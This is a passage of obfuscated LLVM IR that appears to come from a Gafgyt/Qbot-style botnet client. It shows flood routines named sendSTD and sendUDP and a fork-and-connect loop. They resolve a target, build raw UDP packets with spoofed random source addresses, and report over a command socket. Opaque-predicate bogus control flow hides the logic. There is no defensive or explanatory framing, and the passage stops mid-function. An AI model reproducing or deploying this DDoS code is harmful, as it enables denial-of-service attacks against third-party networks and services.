  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.377, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #5
  store i32 0, i32* %15, align 4
  br label %38

; <label>:38:                                     ; preds = %originalBBpart223, %6
  %39 = load i32, i32* %15, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %134

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @x.95
  %44 = load i32, i32* @y.96
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = call i32 @fork() #5
  %52 = icmp ne i32 %51, 0
  %53 = load i32, i32* @x.95
  %54 = load i32, i32* @y.96
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %61, label %114

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = load i32, i32* @x.95
  %63 = load i32, i32* @y.96
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* @x.95
  %71 = load i32, i32* @y.96
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %78

; <label>:78:                                     ; preds = %112, %originalBBpart24
  %79 = load i32, i32* %16, align 4
  %80 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %81 = icmp sgt i32 %79, %80
  br i1 %81, label %82, label %113

; <label>:82:                                     ; preds = %78
  %83 = load i8*, i8** %7, align 8
  %84 = load i16, i16* %9, align 2
  %85 = call i32 @socket_connect(i8* %83, i16 zeroext %84)
  store i32 %85, i32* %18, align 4
  %86 = load i32, i32* %18, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %112

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* @x.95
  %90 = load i32, i32* @y.96
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i32, i32* %18, align 4
  %98 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %99 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %100 = call i64 @strlen(i8* %99) #10
  %101 = call i64 @write(i32 %97, i8* %98, i64 %100)
  %102 = load i32, i32* %18, align 4
  %103 = call i32 @close(i32 %102)
  %104 = load i32, i32* @x.95
  %105 = load i32, i32* @y.96
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %112

; <label>:112:                                    ; preds = %originalBBpart28, %82
  br label %78

; <label>:113:                                    ; preds = %78
  call void @_exit(i32 1) #12
  unreachable

; <label>:114:                                    ; preds = %originalBBpart2
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = load i32, i32* @x.95
  %117 = load i32, i32* @y.96
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* %15, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %15, align 4
  %126 = load i32, i32* @x.95
  %127 = load i32, i32* @y.96
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart223, label %originalBB10alteredBB

originalBBpart223:                                ; preds = %originalBB10
  br label %38

; <label>:134:                                    ; preds = %38
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %42
  %135 = call i32 @fork() #5
  %136 = icmp ne i32 %135, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %137 = load i32, i32* %18, align 4
  %138 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %139 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %140 = call i64 @strlen(i8* %139) #10
  %141 = call i64 @write(i32 %137, i8* %138, i64 %140)
  %142 = load i32, i32* %18, align 4
  %143 = call i32 @close(i32 %142)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %144 = load i32, i32* %15, align 4
  %_ = shl i32 %144, 1
  %_11 = sub i32 0, %144
  %gen = add i32 %_11, 1
  %_12 = sub i32 0, %144
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 %144, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 %144, 1
  %gen17 = mul i32 %_16, 1
  %_18 = shl i32 %144, 1
  %_19 = shl i32 %144, 1
  %_20 = sub i32 %144, 1
  %gen21 = mul i32 %_20, 1
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %15, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #5
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %82, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #5
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %82

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 75, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add nsw i64 %57, %59
  %61 = icmp sge i64 %56, %60
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %48
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #12
  unreachable

; <label>:65:                                     ; preds = %48
  %66 = load i32, i32* @x.97
  %67 = load i32, i32* @y.98
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %65
  store i32 0, i32* %11, align 4
  %74 = load i32, i32* @x.97
  %75 = load i32, i32* @y.98
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %82

; <label>:82:                                     ; preds = %originalBBpart2, %39
  %83 = load i32, i32* %11, align 4
  %84 = add i32 %83, 1
  store i32 %84, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %65
  store i32 0, i32* %11, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i32, i32* @x.99
  %42 = load i32, i32* @y.100
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %40
  %49 = load i8*, i8** %7, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %51 = call i32 @getHost(i8* %49, %struct.in_addr* %50)
  %52 = icmp ne i32 %51, 0
  %53 = load i32, i32* @x.99
  %54 = load i32, i32* @y.100
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %61, label %62

; <label>:61:                                     ; preds = %originalBBpart2
  br label %397

; <label>:62:                                     ; preds = %originalBBpart2
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %64 = getelementptr inbounds [8 x i8], [8 x i8]* %63, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 8, i32 4, i1 false)
  %65 = load i32, i32* %12, align 4
  store i32 %65, i32* %14, align 4
  %66 = load i32, i32* %10, align 4
  %67 = icmp eq i32 %66, 32
  br i1 %67, label %68, label %168

; <label>:68:                                     ; preds = %62
  %69 = call i32 @socket(i32 2, i32 2, i32 17) #5
  store i32 %69, i32* %15, align 4
  %70 = load i32, i32* %15, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %91, label %72

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @x.99
  %74 = load i32, i32* @y.100
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  %83 = load i32, i32* @x.99
  %84 = load i32, i32* @y.100
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %397

; <label>:91:                                     ; preds = %68
  %92 = load i32, i32* %11, align 4
  %93 = add nsw i32 %92, 1
  %94 = sext i32 %93 to i64
  %95 = call noalias i8* @malloc(i64 %94) #5
  store i8* %95, i8** %16, align 8
  %96 = load i8*, i8** %16, align 8
  %97 = icmp eq i8* %96, null
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %91
  br label %397

; <label>:99:                                     ; preds = %91
  %100 = load i8*, i8** %16, align 8
  %101 = load i32, i32* %11, align 4
  %102 = add nsw i32 %101, 1
  %103 = sext i32 %102 to i64
  call void @llvm.memset.p0i8.i64(i8* %100, i8 0, i64 %103, i32 1, i1 false)
  %104 = load i8*, i8** %16, align 8
  %105 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %104, i32 %105)
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = load i32, i32* %9, align 4
  %108 = add nsw i32 %106, %107
  store i32 %108, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %109

; <label>:109:                                    ; preds = %164, %163, %99
  %110 = load i32, i32* %15, align 4
  %111 = load i8*, i8** %16, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %115 = call i64 @sendto(i32 %110, i8* %111, i64 %113, i32 0, %struct.sockaddr* %114, i32 16)
  %116 = load i32, i32* %18, align 4
  %117 = load i32, i32* %14, align 4
  %118 = icmp eq i32 %116, %117
  br i1 %118, label %119, label %164

; <label>:119:                                    ; preds = %109
  %120 = load i32, i32* @x.99
  %121 = load i32, i32* @y.100
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %119
  %128 = load i32, i32* %8, align 4
  %129 = icmp eq i32 %128, 0
  %130 = load i32, i32* @x.99
  %131 = load i32, i32* @y.100
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %129, label %138, label %142

; <label>:138:                                    ; preds = %originalBBpart28
  %139 = call i32 @rand_cmwc()
  %140 = trunc i32 %139 to i16
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %140, i16* %141, align 2
  br label %142

; <label>:142:                                    ; preds = %138, %originalBBpart28
  %143 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %144 = load i32, i32* %17, align 4
  %145 = icmp sgt i32 %143, %144
  br i1 %145, label %146, label %163

; <label>:146:                                    ; preds = %142
  %147 = load i32, i32* @x.99
  %148 = load i32, i32* @y.100
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %146
  %155 = load i32, i32* @x.99
  %156 = load i32, i32* @y.100
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %167

; <label>:163:                                    ; preds = %142
  store i32 0, i32* %18, align 4
  br label %109

; <label>:164:                                    ; preds = %109
  %165 = load i32, i32* %18, align 4
  %166 = add i32 %165, 1
  store i32 %166, i32* %18, align 4
  br label %109

; <label>:167:                                    ; preds = %originalBBpart212
  br label %397

; <label>:168:                                    ; preds = %62
  %169 = load i32, i32* @x.99
  %170 = load i32, i32* @y.100
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %168
  %177 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %177, i32* %19, align 4
  %178 = load i32, i32* %19, align 4
  %179 = icmp ne i32 %178, 0
  %180 = load i32, i32* @x.99
  %181 = load i32, i32* @y.100
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %179, label %191, label %188

; <label>:188:                                    ; preds = %originalBBpart216
  %189 = load i32, i32* @mainCommSock, align 4
  %190 = call i32 (i32, i8*, ...) @sockprintf(i32 %189, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  br label %397

; <label>:191:                                    ; preds = %originalBBpart216
  store i32 1, i32* %20, align 4
  %192 = load i32, i32* %19, align 4
  %193 = bitcast i32* %20 to i8*
  %194 = call i32 @setsockopt(i32 %192, i32 0, i32 3, i8* %193, i32 4) #5
  %195 = icmp slt i32 %194, 0
  br i1 %195, label %196, label %199

; <label>:196:                                    ; preds = %191
  %197 = load i32, i32* @mainCommSock, align 4
  %198 = call i32 (i32, i8*, ...) @sockprintf(i32 %197, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i32 0, i32 0))
  br label %397

; <label>:199:                                    ; preds = %191
  store i32 50, i32* %21, align 4
  br label %200

; <label>:200:                                    ; preds = %204, %199
  %201 = load i32, i32* %21, align 4
  %202 = add nsw i32 %201, -1
  store i32 %202, i32* %21, align 4
  %203 = icmp ne i32 %201, 0
  br i1 %203, label %204, label %209

; <label>:204:                                    ; preds = %200
  %205 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %206 = call i32 @rand_cmwc()
  %207 = xor i32 %205, %206
  call void @srand(i32 %207) #5
  %208 = call i32 @rand() #5
  call void @init_rand(i32 %208)
  br label %200

; <label>:209:                                    ; preds = %200
  %210 = load i32, i32* %10, align 4
  %211 = icmp eq i32 %210, 0
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %209
  store i32 0, i32* %22, align 4
  br label %235

; <label>:213:                                    ; preds = %209
  %214 = load i32, i32* @x.99
  %215 = load i32, i32* @y.100
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %213
  %222 = load i32, i32* %10, align 4
  %223 = sub nsw i32 32, %222
  %224 = shl i32 1, %223
  %225 = sub nsw i32 %224, 1
  %226 = xor i32 %225, -1
  store i32 %226, i32* %22, align 4
  %227 = load i32, i32* @x.99
  %228 = load i32, i32* @y.100
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart235, label %originalBB18alteredBB

originalBBpart235:                                ; preds = %originalBB18
  br label %235

; <label>:235:                                    ; preds = %originalBBpart235, %212
  %236 = load i32, i32* @x.99
  %237 = load i32, i32* @y.100
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %235
  %244 = load i32, i32* %11, align 4
  %245 = sext i32 %244 to i64
  %246 = add i64 28, %245
  %247 = call i8* @llvm.stacksave()
  store i8* %247, i8** %23, align 8
  %248 = alloca i8, i64 %246, align 16
  %249 = bitcast i8* %248 to %struct.iphdr*
  store %struct.iphdr* %249, %struct.iphdr** %24, align 8
  %250 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %251 = bitcast %struct.iphdr* %250 to i8*
  %252 = getelementptr i8, i8* %251, i64 20
  %253 = bitcast i8* %252 to %struct.udphdr*
  store %struct.udphdr* %253, %struct.udphdr** %25, align 8
  %254 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %255 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %256 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %255, i32 0, i32 0
  %257 = load i32, i32* %256, align 4
  %258 = load i32, i32* %22, align 4
  %259 = call i32 @getRandomIP(i32 %258)
  %260 = call i32 @htonl(i32 %259) #13
  %261 = load i32, i32* %11, align 4
  %262 = sext i32 %261 to i64
  %263 = add i64 8, %262
  %264 = trunc i64 %263 to i32
  call void @makeIPPacket(%struct.iphdr* %254, i32 %257, i32 %260, i8 zeroext 17, i32 %264)
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = add i64 8, %266
  %268 = trunc i64 %267 to i16
  %269 = call zeroext i16 @htons(i16 zeroext %268) #13
  %270 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon.2* %271 to %struct.anon.3*
  %273 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %272, i32 0, i32 2
  store i16 %269, i16* %273, align 2
  %274 = call i32 @rand_cmwc()
  %275 = trunc i32 %274 to i16
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i32 0, i32 0
  %278 = bitcast %union.anon.2* %277 to %struct.anon.3*
  %279 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %278, i32 0, i32 0
  store i16 %275, i16* %279, align 2
  %280 = load i32, i32* %8, align 4
  %281 = icmp eq i32 %280, 0
  %282 = load i32, i32* @x.99
  %283 = load i32, i32* @y.100
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart258, label %originalBB37alteredBB

originalBBpart258:                                ; preds = %originalBB37
  br i1 %281, label %290, label %292

; <label>:290:                                    ; preds = %originalBBpart258
  %291 = call i32 @rand_cmwc()
  br label %297

; <label>:292:                                    ; preds = %originalBBpart258
  %293 = load i32, i32* %8, align 4
  %294 = trunc i32 %293 to i16
  %295 = call zeroext i16 @htons(i16 zeroext %294) #13
  %296 = zext i16 %295 to i32
  br label %297

; <label>:297:                                    ; preds = %292, %290
  %298 = phi i32 [ %291, %290 ], [ %296, %292 ]
  %299 = trunc i32 %298 to i16
  %300 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %301 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon.2* %301 to %struct.anon.3*
  %303 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %302, i32 0, i32 1
  store i16 %299, i16* %303, align 2
  %304 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %305 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %304, i32 0, i32 0
  %306 = bitcast %union.anon.2* %305 to %struct.anon.3*
  %307 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %306, i32 0, i32 3
  store i16 0, i16* %307, align 2
  %308 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %309 = bitcast %struct.udphdr* %308 to i8*
  %310 = getelementptr inbounds i8, i8* %309, i64 8
  %311 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %310, i32 %311)
  %312 = bitcast i8* %248 to i16*
  %313 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 2
  %315 = load i16, i16* %314, align 2
  %316 = zext i16 %315 to i32
  %317 = call zeroext i16 @csum(i16* %312, i32 %316)
  %318 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 7
  store i16 %317, i16* %319, align 2
  %320 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %321 = load i32, i32* %9, align 4
  %322 = add nsw i32 %320, %321
  store i32 %322, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %323

; <label>:323:                                    ; preds = %392, %391, %297
  br label %324

; <label>:324:                                    ; preds = %323
  %325 = load i32, i32* %19, align 4
  %326 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %327 = call i64 @sendto(i32 %325, i8* %248, i64 %246, i32 0, %struct.sockaddr* %326, i32 16)
  %328 = call i32 @rand_cmwc()
  %329 = trunc i32 %328 to i16
  %330 = load %struct.udphdr*, %struct.udphdr** %25, align 8
